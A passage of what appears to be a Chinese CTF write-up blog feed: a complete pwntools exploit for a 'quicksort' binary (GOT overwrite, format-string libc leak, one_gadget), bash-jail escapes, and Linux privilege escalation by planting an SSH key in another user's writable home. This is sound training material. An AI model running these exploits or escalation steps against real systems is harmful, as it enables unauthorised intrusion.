0;  v11 = 0;  v12 = 0;  v13 = 0;  v14 = 0;  v15 = 0;  v16 = 0;  v17 = 0;  s = 0;  sum = 0;  puts(&quot;how many numbers do you want to sort?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;sum);  getchar();  ptr = (char *)malloc(4 * sum);  for ( i = 0; i &lt; sum; ++i )  {    printf(&quot;the %dth number:&quot;, i + 1);    gets(&amp;s);    num = &amp;ptr[4 * i];    *(_DWORD *)num = atoi(&amp;s);  }  quicksort((int)ptr, 0, sum - 1);  puts(&quot;Here is the result:&quot;);  for ( j = 0; j &lt; sum; ++j )    printf(&quot;%d &quot;, *(_DWORD *)&amp;ptr[4 * j]);  puts(&amp;byte_8048AD2);  free(ptr);  return __readgsdword(0x14u) ^ v22;}</code></pre><p>程序要求输入一个数字 sum，然后再输入 sum 个数字，最后对这些数字快排之后得到结果。</p><p>这里漏洞很明显是有一个 <code>gets</code>，然而显然做不到直接 rop。在调试一段时间之后，发现了一个任意地址写的地方：</p><pre><code>assassinq&gt;&gt; stack 200000| 0xffe85300 --&gt; 0xffe8531c --&gt; 0x00004| 0xffe85304 --&gt; 0x10008| 0xffe85308 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00012| 0xffe8530c --&gt; 0x80488c5 (mov    eax,DWORD PTR [ebp-0x1c])0016| 0xffe85310 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00020| 0xffe85314 --&gt; 0xf77b8010 (&lt;_dl_runtime_resolve+16&gt;:    pop    edx)0024| 0xffe85318 --&gt; 0xf7782864 --&gt; 0x00028| 0xffe8531c --&gt; 0x00032| 0xffe85320 --&gt; 0x00036| 0xffe85324 --&gt; 0x00040| 0xffe85328 --&gt; 0x00044| 0xffe8532c --&gt; 0x20048| 0xffe85330 --&gt; 0x00052| 0xffe85334 --&gt; 0x00056| 0xffe85338 --&gt; 0x83d0008 --&gt; 0x00060| 0xffe8533c --&gt; 0x9838e2000064| 0xffe85340 --&gt; 0x10068| 0xffe85344 --&gt; 0x00072| 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00076| 0xffe8534c --&gt; 0x80489e4 (mov    eax,0x0)</code></pre><p>在读取数字的 <code>gets</code> 这里停下，查看栈的情况。这里的 <code>0x83d0008</code> 是程序中的 <code>ptr</code>，然后程序会将我们输入的字符串 <code>atoi</code> 之后，赋给 <code>ptr</code> 指向的地址。在中间还有一个地址存放剩余循环的次数。我们可以通过缓冲区溢出，一开始的数字为我们想要修改的内容，中间存放剩余循环次数，最后放我们要写的地址，就达到了任意地址写的目的。而 <code>canary</code> 又在下面，不会受到影响。</p><p>接下来就需要想办法泄漏，n132 学长提供了一个思路就是改成 <code>printf</code> 之后直接 format string。最后的思路是把 <code>free</code> 改成了 <code>printf</code>，然后泄漏 libc 上的地址。这里要注意的一点就是 <code>atoi</code> 返回的值是 <code>signed int</code>，如果字符串超过了四个字符，那就会返回 <code>0x7fffffff</code>，所以泄漏的时候找了第六个参数，<code>%6$p</code> 就不会超过 <code>signed int</code>。</p><pre><code>0056| 0xff8348f8 --&gt; 0x804a800 --&gt; 0x7fffffff</code></pre><p><code>free</code> 完之后还需要写 <code>one_gadget</code>，所以这里想办法再跳回到 <code>func</code>。想要绕过 <code>canary</code> 肯定是不可能了，所以前面也利用了一次任意写，把 <code>__stack_chk_fail</code> 改成了 <code>func</code>，这样又能跳回来。</p><p>最后写 <code>one_gadget</code> 的时候又遇到了上面 <code>signed int</code> 的问题，这个无法避免了。想到的一个骚思路是用补码，传一个负数进去，就能写上 <code>one_gadget</code> 了。</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]local = 0if local:    p = process(&#39;./quicksort&#39;)    libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;34.92.96.238&#39;, 10000)    libc = ELF(&#39;./libc.so.6&#39;)elf = ELF(&#39;./quicksort&#39;)g = lambda x: next(elf.search(asm(x)))gets_plt = elf.plt[&#39;gets&#39;]gets_got = elf.got[&#39;gets&#39;]puts_plt = elf.plt[&#39;puts&#39;] # 0x8048560puts_got = elf.got[&#39;puts&#39;] # 0x804a02cfree_got = elf.got[&#39;free&#39;] # 0x804a018atoi_got = elf.got[&#39;atoi&#39;]printf_got = elf.got[&#39;printf&#39;]printf_plt = elf.plt[&#39;printf&#39;]func = 0x08048816buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100stack_chk_fail_got = elf.got[&#39;__stack_chk_fail&#39;]#gdb.attach(p, &#39;&#39;&#39;#b *0x80489aa#&#39;&#39;&#39;)def write(addr, val, t):    payload = str(val)    payload += (0x10 - len(payload)) * &#39;\x00&#39;    payload += p32(t)    payload += (0x1C - len(payload)) * &#39;\x00&#39;    payload += p32(addr)    p.recvuntil(&#39;number:&#39;)    p.sendline(payload)def overflow(addr, val, t):    payload = str(val)    payload += (0x10 - len(payload)) * &#39;\x00&#39;    payload += p32(t)    payload += (0x1C - len(payload)) * &#39;\x00&#39;    payload += p32(addr) + &#39;\x00&#39; * 4    p.recvuntil(&#39;number:&#39;)    p.sendline(payload)t = 2p.recvuntil(&#39;sort?\n&#39;)p.sendline(str(t))write(free_got, printf_plt, 2)write(stack_chk_fail_got, func, 2)fmt = &#39;%6$p&#39;overflow(buf, str(int(fmt[::-1].encode(&#39;hex&#39;), 16)), 1)p.recvuntil(&#39;0x&#39;)libc_base = int(p.recv(8), 16) - 0x1b3864success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + 0x3ac62success(&#39;one_gadget = &#39; + hex(one_gadget))one_gadget_complement = -(0x100000000 - one_gadget)success(&#39;one_gadget_complement = &#39; + hex(one_gadget_complement))p.recvuntil(&#39;sort?\n&#39;)p.sendline(str(t))overflow(stack_chk_fail_got, one_gadget_complement, 1)p.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Linux Category Challenges</title>
    <link href="/2019/04/15/Some-Linux-Category-Challenges/"/>
    <url>/2019/04/15/Some-Linux-Category-Challenges/</url>
    
    <content type="html"><![CDATA[<p>在 Byte Bandits CTF 2019 和 WPICTF 2019 中又遇到了 Linux 题，记录一下。</p><a id="more"></a><h1 id="Byte-Bandits-CTF-2019"><a href="#Byte-Bandits-CTF-2019" class="headerlink" title="Byte Bandits CTF 2019"></a>Byte Bandits CTF 2019</h1><h2 id="bash-fu"><a href="#bash-fu" class="headerlink" title="bash-fu"></a>bash-fu</h2><pre><code class="bash">$ nc 13.234.130.76 7002bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash-4.4$ lslsbash: LS: command not foundbash-4.4$ pwdpwdbash: PWD: command not found</code></pre><p>显然 bash 是区分大小写的，而后台有一个程序把我们输入的命令改成了大写字母。谷歌一下可以找到<a href="https://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/" target="_blank" rel="noopener">shell 如何将字母进行大小写转换</a>。然后定义一下变量，执行<code>${l,,}</code>就能执行小写的命令了。</p><pre><code class="bash">bash-4.4$ l=&quot;ls /&quot;l=&quot;ls /&quot;bash-4.4$ ${l,,}${l,,}bin    etc    jail   media  opt    root   sbin   sys    usrdev    home   lib    mnt    proc   run    srv    tmp    varbash-4.4$ l=&quot;ls /jail/&quot;l=&quot;ls /jail/&quot;bash-4.4$ ${l,,}${l,,}flag.txt  jailbash-4.4$ c=&quot;cat /jail/flag.txt&quot;c=&quot;cat /jail/flag.txt&quot;bash-4.4$ ${c,,}${c,,}flag{b@$h_jails_are_3asy_p3@sy}</code></pre><p>看一下 <code>jail</code>，主要就是把小写字母替换成了大写：</p><pre><code class="bash">bash-4.4$ cat jailcat jailpreexec () {    filtered=$(echo $BASH_COMMAND | tr &#39;[:lower:]&#39; &#39;[:upper:]&#39;)    eval $filtered}preexec_invoke_exec () {    [ -n &quot;$COMP_LINE&quot; ] &amp;&amp; return  # do nothing if completing    [ &quot;$BASH_COMMAND&quot; = &quot;$PROMPT_COMMAND&quot; ] &amp;&amp; return # don&#39;t cause a preexec for $PROMPT_COMMAND    [ &quot;$BASH_COMMAND&quot; = &quot;shopt -s extdebug&quot; ] &amp;&amp; return    preexec    return 1}shopt -s extdebugset -o noglobtrap &#39;preexec_invoke_exec&#39; DEBUG &amp;&amp; shopt -s extdebug# vim:ft=sh</code></pre><p>还看到另外有一种做法是，用 <code>$0</code>：</p><pre><code class="bash">bash-4.4$ $0$0bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash: /root/.bashrc: Permission deniedbash-4.4$ cd /jailcd /jailbash-4.4$ lslsflag.txt  jailbash-4.4$ cat flag.txtcat flag.txtflag{b@$h_jails_are_3asy_p3@sy}</code></pre><p>测试了一下发现 <code>$0</code> 表示当前使用的 shell：</p><pre><code class="bash">root@152486b98e3d:~# echo $0/bin/bashroot@152486b98e3d:~# $0root@152486b98e3d:~# exitroot@152486b98e3d:~#</code></pre><h1 id="WPICTF-2019"><a href="#WPICTF-2019" class="headerlink" title="WPICTF 2019"></a>WPICTF 2019</h1><h2 id="suckmore-shell"><a href="#suckmore-shell" class="headerlink" title="suckmore-shell"></a>suckmore-shell</h2><pre><code class="bash">$ ssh ctf@107.21.60.114ctf@107.21.60.114&#39;s password:SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;lssuckmore&gt;ls -hsleep: invalid option -- &#39;h&#39;Try &#39;sleep --help&#39; for more information.suckmore&gt;dirbin  boot  dev    etc  home  lib    lib64  lost+found  media  mnt  opt  proc  root    run  sbin  srv    sys  tmp  usr  varsuckmore&gt;cd homecal: failed to parse timestamp or unknown month name: home</code></pre><p><code>ls</code> 被 <code>alias</code> 成了 <code>sleep</code>，<code>cd</code> 也变成了 <code>cal</code>，可以用 <code>dir</code> 来代替 <code>ls</code>。尝试用 <code>$0</code> 无果：</p><pre><code>suckmore&gt;$0SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;shWhy would you ever want to leave suckmore shell?</code></pre><p>这里用 <code>exec</code> 来换 shell：</p><pre><code class="bash">suckmore&gt;exec /bin/shsuckmore&gt;lssh: /usr/bin/ls: Permission deniedsuckmore&gt;dirbin  boot  dev    etc  home  lib    lib64  lost+found  media  mnt  opt  proc  root    run  sbin  srv    sys  tmp  usr  varsuckmore&gt;cd homesuckmore&gt;dirctfsuckmore&gt;cd ctfsuckmore&gt;dirflagsuckmore&gt;cat flagsh: /usr/bin/cat: Permission deniedsuckmore&gt;sed &#39;&#39; flagWPI{bash_sucks0194342}</code></pre><h2 id="pseudo-random"><a href="#pseudo-random" class="headerlink" title="pseudo-random"></a>pseudo-random</h2><pre><code class="bash">$ ssh ctf@prand.wpictf.xyzctf@prand.wpictf.xyz&#39;s password:sh-4.4$ lsbin  boot  dev    etc  home  lib    lib64  lost+found  media  mnt  opt  proc  root    run  sbin  srv    sys  tmp  usr  varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a.  ..  .bash_logout  .bash_profile  .bashrcsh-4.4$ cd /sh-4.4$ lsbin  boot  dev    etc  home  lib    lib64  lost+found  media  mnt  opt  proc  root    run  sbin  srv    sys  tmp  usr  varsh-4.4$ cd devsh-4.4$ lsconsole  core  fd  full  mqueue  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zerosh-4.4$ file *randomrandom:  openssl enc&#39;d data with salted passwordurandom: ASCII text</code></pre><p>根据题目的提示，在 dev 目录下找到了一个不寻常的文件。通过 <code>openssl</code> 解密 <code>aes-256-cbc</code>，指定解密文件为 <code>random</code>，指定口令存放文件为 <code>urandom</code>：</p><pre><code class="bash">sh-4.4$ openssl enc -d -aes-256-cbc -in random -kfile urandom*** WARNING : deprecated key derivation used.Using -iter or -pbkdf2 would be better.Being holy in our church means installing a wholly free operating system--GNU/Linux is a good choice--and not putting any non-free software on your computer. Join the Church of Emacs, and you too can be a saint!And lo, it came to pass, that the neophyte encountered the Beplattered One and humbly posed the question &quot;Oh great master, is it a sin to use vi?&quot; And St. IGNUcuis dist thus reply unto him, &quot;No, my young hacker friend, it is not a sin. It is a penance.&quot;WPI{@11_Ur_d3v1c3s_r_b3l0ng_2_us}</code></pre><h2 id="crond"><a href="#crond" class="headerlink" title="crond"></a>crond</h2><pre><code class="bash">$ ssh ctf@crond.wpictf.xyzctf@crond.wpictf.xyz&#39;s password:sh-4.4$ lsbin  boot  dev    etc  home  lib    lib64  lost+found  media  mnt  opt  proc  root    run  sbin  srv    sys  tmp  usr  varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a.  ..  .bash_logout  .bash_profile  .bashrcsh-4.4$ cd /</code></pre><p>找了一圈没什么收获，尝试看看进程下有什么特殊的地方：</p><pre><code class="bash">sh-4.4$ pssh: ps: command not foundsh-4.4$ ls /proc1    acpi    cpuinfo    execdomains    ioports    kmsg        mdstat     net           self     sysrq-trigger    version10   buddyinfo    crypto       fb        irq       kpagecgroup    meminfo  pagetypeinfo  slabinfo  sysvipc    version_signature11   bus    devices    filesystems    kallsyms   kpagecount    misc     partitions    softirqs  thread-self    vmallocinfo320  cgroups    diskstats  fs        kcore       kpageflags    modules  sched_debug   stat     timer_list    vmstat321  cmdline    dma       interrupts    key-users  loadavg    mounts     schedstat     swaps     tty        xen8    consoles    driver       iomem    keys       locks    mtrr     scsi           sys     uptime        zoneinfosh-4.4$ cd procsh-4.4$ for i in `ls */cmdline`; do cat -A $i; echo &#39;&#39;; done/bin/bash^@/bin/init_d^@su^@ctf^@sh^@sleep^@1^@cat: 1482/cmdline: No such file or directory/bin/bash^@/usr/bin/fakecron^@cat^@-A^@self/cmdline^@cat^@-A^@thread-self/cmdline^@</code></pre><p>尝试把每个进程的 <code>cmdline</code> 读出来，发现了跑着一个叫 <code>/usr/bin/fakcron</code> 的东西。<code>cron</code> 是运用 Linux 所不可缺少的工具，可用来定期的管理获取日志的软件，定期的检查系统状态，可用来监视进程或者其它主机是否正常运行。</p><pre><code class="bash">sh-4.4$ sed &#39;&#39; /usr/bin/fakecron#!/bin/bash# Cron. But worse.## Copyright (c) 2019, SuckMore Software, a division of WPI Digital Holdings Ltd.# Redistribution and use in source and binary forms, with or without# modification, are permitted provided that the following conditions are met:# 1. Redistributions of source code must retain the above copyrig#    notice, this list of conditions and the following disclaimer.# 2. Redistributions in binary form must reproduce the above copyright#    notice, this list of conditions and the following disclaimer in the#    documentation and/or other materials provided with the distribution.# 3. All advertising materials mentioning features or use of this software#    must display the following acknowledgement:#    This product includes software developed by SuckMore Software, a division#    of WPI Digital Holdings Ltd.# 4. Neither the name of the SuckMore Software, a division of WPI Digital Holdings#    Ltd, nor the names of its contributors may be used to endorse or promote#    products derived from this software without specific prior written permission.## THIS SOFTWARE IS PROVIDED BY SuckMore Software, a division of# WPI Digital Holdings Ltd., &#39;&#39;AS IS&#39;&#39; AND ANY EXPRESS OR IMPLIED WARRANTIES,# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL# SuckMore Software, a division of WPI Digital Holdings Ltd.# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.file=&quot;/etc/deadline&quot;cron() {    second=0    minute=0    hour=0    day=1;    month=1;    year=2019;    while true; do        sleep 1;        target_second=`cut -d &quot; &quot; -f 6 $file`        target_minute=`cut -d &quot; &quot; -f 5 $file`        target_hour=`cut -d &quot; &quot; -f 4 $file`        target_day=`cut -d &quot; &quot; -f 3 $file`        target_month=`cut -d &quot; &quot; -f 2 $file`        target_year=`cut -d &quot; &quot; -f 1 $file`        if [[ &quot;$second&quot; -eq 59 ]]; then            minute=$((minute+1));            second=0;        elif [[ &quot;$minute&quot; -eq 59 ]]; then            hour=$((hour+1));            second=0;            minute=0;        else            second=$((second+1));        fi        if [[ &quot;$year&quot; -eq &quot;$target_year&quot; ]] \            &amp;&amp; [[ &quot;$month&quot; -eq &quot;$target_month&quot; ]] \            &amp;&amp; [[ &quot;$day&quot; -eq &quot;$target_day&quot; ]] \            &amp;&amp; [[ &quot;$hour&quot; -eq &quot;$target_second&quot; ]] \            &amp;&amp; [[ &quot;$minute&quot; -eq &quot;$target_minute&quot; ]] \            &amp;&amp; [[ &quot;$second&quot; -eq &quot;$target_hour&quot; ]]; then            # echo &quot;WPI{}&quot; &gt; /home/ctf/flag.txt            exec_flag        fi        rm /etc/faketimerc        echo &quot;$year-$month-$day $hour:$minute:$second&quot; &gt; /etc/faketimerc    done}cron &amp;</code></pre><p>发现只要在 <code>/etc/faketimerc</code> 中的时间和 <code>/etc/deadline</code> 中的值相同的时候，就会在家目录生成 flag：</p><pre><code class="bash">sh-4.4$ cat /etc/faketimerc2019-1-1 0:0:11sh-4.4$ cat /etc/deadline2020 1 1 0 1 0sh-4.4$ echo &quot;2019 1 1 0 2 0&quot; &gt; /etc/deadlinesh-4.4$ cat /etc/faketimerc2019-1-1 0:2:51sh-4.4$ ls /home/ctf/flag.txtsh-4.4$ cat /home/ctf/flag.txt&quot;WPI{L1nUxH@ck3r01a4}&quot;</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/" target="_blank" rel="noopener">https://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/</a><br><a href="https://dark-lambda.com/2019/04/14/ctf/bytebandits-ctf-2019/bash-fu/" target="_blank" rel="noopener">https://dark-lambda.com/2019/04/14/ctf/bytebandits-ctf-2019/bash-fu/</a><br><a href="https://www.youtube.com/watch?v=RgcchGiTxpk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=RgcchGiTxpk</a><br><a href="https://infosec.rm-it.de/2019/04/15/wpictf-2019-linux-category/" target="_blank" rel="noopener">https://infosec.rm-it.de/2019/04/15/wpictf-2019-linux-category/</a><br><a href="https://blog.51cto.com/shjia/1427138" target="_blank" rel="noopener">https://blog.51cto.com/shjia/1427138</a><br><a href="https://www.netkiller.cn/cryptography/openssl/index.html" target="_blank" rel="noopener">https://www.netkiller.cn/cryptography/openssl/index.html</a><br><a href="http://man.linuxde.net/openssl" target="_blank" rel="noopener">http://man.linuxde.net/openssl</a><br><a href="https://www.cnblogs.com/wang_yb/p/3804200.html" target="_blank" rel="noopener">https://www.cnblogs.com/wang_yb/p/3804200.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Category Challs in b00t2root-2019</title>
    <link href="/2019/03/31/Linux-Category-Challs-in-b00t2root-2019/"/>
    <url>/2019/03/31/Linux-Category-Challs-in-b00t2root-2019/</url>
    
    <content type="html"><![CDATA[<p>这个比赛有一类 linux 的题，感觉很有意思。</p><a id="more"></a><h1 id="Steve-Rogers（LINUX-Enumeration）"><a href="#Steve-Rogers（LINUX-Enumeration）" class="headerlink" title="Steve Rogers（LINUX Enumeration）"></a>Steve Rogers（LINUX Enumeration）</h1><p>Steve knows there’s a flag somewhere in plain sight. Login as <code>steve</code> and find it for him.</p><p>给了一个 socat 的脚本，连上去以后是一个 docker。看了一下 <code>steve</code> 家目录下没有什么东西，隐藏文件也是一些没用的像是 <code>.bashrc</code> 还有 <code>.profile</code> 之类的文件。可以先试试 <code>cat /etc/passwd</code> 能不能用，看看服务器上有哪些用户：</p><pre><code class="bash">steve@d18fb074a417:~$ lssteve@d18fb074a417:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsshd:x:104:65534::/run/sshd:/usr/sbin/nologinsteve:x:1000:1000:,,,:/home/steve:/bin/bashtony:x:1001:0:,,,:/home/tony:/bin/bash</code></pre><p>可以看到除了一开始的 <code>root</code>，最下面还有 <code>steve</code> 和 <code>tony</code>两个用户，上面还有一个 <code>sshd</code>，说明服务器上起了 ssh。这里推荐一个关于 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">Linux 提权基础（Basic Linux Privilege Escalation）</a>的网站，上面提供了很多可以提权的小命令。我们先用 <code>ps aux</code> 做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务：</p><pre><code class="bash">steve@d18fb074a417:~$ ps auxUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot         1  0.0  0.0  18376  3108 pts/0    Ss   09:52   0:00 bash /tmp/42.shroot        14  0.0  0.0  72296  3408 ?        Ss   09:52   0:00 /usr/sbin/sshdroot        16  0.0  0.0  55952  3344 pts/0    S    09:52   0:00 su -l stevesteve       18  0.0  0.0  18508  3444 pts/0    S    09:52   0:00 -susteve       25  0.0  0.0  34400  3028 pts/0    R+   09:55   0:00 ps auxsteve@d18fb074a417:~$ cat /tmp/42.shcat: /tmp/42.sh: No such file or directory</code></pre><p>可以看到一个 <code>bash /tmp/42.sh</code> 很引人注目，但是试图打开它的时候失败了。再试试 <code>ps -ef</code>，<code>man</code> 一下看看这两个参数：</p><pre><code>...     -A      Display information about other users&#39; processes, including those without controlling terminals....     -e      Identical to -A.     -f      Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso-             ciated command.  If the -u option is also used, display the user name rather then the numeric uid.  When -o or -O is used             to add to the display following -f, the command field is not truncated as severely as it is in other formats....</code></pre><p>也就是显示 <code>uid</code>、<code>pid</code>、<code>ppid</code> 等相关信息，然后看看输出：</p><pre><code class="bash">steve@d18fb074a417:~$ ps -efUID        PID  PPID  C STIME TTY          TIME CMDroot         1     0  0 09:52 pts/0    00:00:00 bash /tmp/42.sh b00t2root{Cmd_l1root        14     1  0 09:52 ?        00:00:00 /usr/sbin/sshdroot        16     1  0 09:52 pts/0    00:00:00 su -l stevesteve       18    16  0 09:52 pts/0    00:00:00 -susteve       27    18  0 09:56 pts/0    00:00:00 ps -ef</code></pre><p>我们在 pid 为 1 的进程中看到了 <code>bash /tmp/42.sh b00t2root{Cmd_l1</code>，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在 <code>/proc/1/</code> 下找到一个文件 <code>cmdline</code>，flag 就在里面：</p><pre><code class="bash">steve@d18fb074a417:~$ ls /proc/1/ls: cannot read symbolic link &#39;/proc/1/cwd&#39;: Permission deniedls: cannot read symbolic link &#39;/proc/1/root&#39;: Permission deniedls: cannot read symbolic link &#39;/proc/1/exe&#39;: Permission deniedattr             exe        mounts         projid_map    statusautogroup        fd         mountstats     root          syscallauxv             fdinfo     net            sched         taskcgroup           gid_map    ns             schedstat     timersclear_refs       io         numa_maps      sessionid     timerslack_nscmdline          limits     oom_adj        setgroups     uid_mapcomm             loginuid   oom_score      smaps         wchancoredump_filter  map_files  oom_score_adj  smaps_rollupcpuset           maps       pagemap        stackcwd              mem        patch_state    statenviron          mountinfo  personality    statmsteve@d18fb074a417:~$ cat /proc/1/cmdlinebash/tmp/42.shb00t2root{Cmd_l1n3_fl4g5_4r3_0bv10u5}steve@d18fb074a417:/home/tony$</code></pre><h1 id="Tony-Stank（LINUX-Privilege-Escalataion）"><a href="#Tony-Stank（LINUX-Privilege-Escalataion）" class="headerlink" title="Tony Stank（LINUX Privilege Escalataion）"></a>Tony Stank（LINUX Privilege Escalataion）</h1><p>Professor Hulk requires a flag hidden in <code>tony</code>‘s account to wield the infinity gauntlet. Retrieve it for him by any means necessary.</p><p>我们在上一道题目中发现服务器是开了 ssh 的，在这道题会派上很大的用场。我们尝试进到 tony 的家目录：</p><pre><code class="bash">steve@e2797a47d8f5:~$ cd /home/tonysteve@e2797a47d8f5:/home/tony$ ls -latotal 24drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .drwxr-x--x 1 root root 4096 Mar 29 15:30 ..-rw-r--r-- 1 tony root  220 Mar 29 15:30 .bash_logout-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc---------- 1 tony root   38 Mar 29 15:28 .flag-rw-r--r-- 1 tony root  807 Mar 29 15:30 .profilesteve@e2797a47d8f5:/home/tony$ touch anythingsteve@e2797a47d8f5:/home/tony$ lsanything</code></pre><p>看到了一个 <code>.flag</code> 文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到 <code>/home/tony/.ssh/authorized_keys</code> 中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony：</p><pre><code class="bash">steve@e2797a47d8f5:/home/tony$ mkdir .sshsteve@e2797a47d8f5:/home/tony$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/steve/.ssh/id_rsa):Created directory &#39;/home/steve/.ssh&#39;.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /home/steve/.ssh/id_rsa.Your public key has been saved in /home/steve/.ssh/id_rsa.pub.The key fingerprint is:SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5The key&#39;s randomart image is:+---[RSA 2048]----+|o .              ||.* o             ||o %              ||oO .             ||o.*     S        ||+= O   + =       ||E+Xoo o B .      || o++ = + +       ||.oo.+ o.. ++.    |+----[SHA256]-----+steve@e2797a47d8f5:/home/tony$ ls ~/.sshid_rsa  id_rsa.pubsteve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub &gt;.ssh/authorized_keyssteve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhostThe authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &#39;localhost&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the &#39;unminimize&#39; command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.tony@e2797a47d8f5:~$ iduid=1001(tony) gid=0(root) groups=0(root)tony@e2797a47d8f5:~$ ls -altotal 36drwxrwxrwx 1 tony  root  4096 Mar 31 11:38 .drwxr-x--x 1 root  root  4096 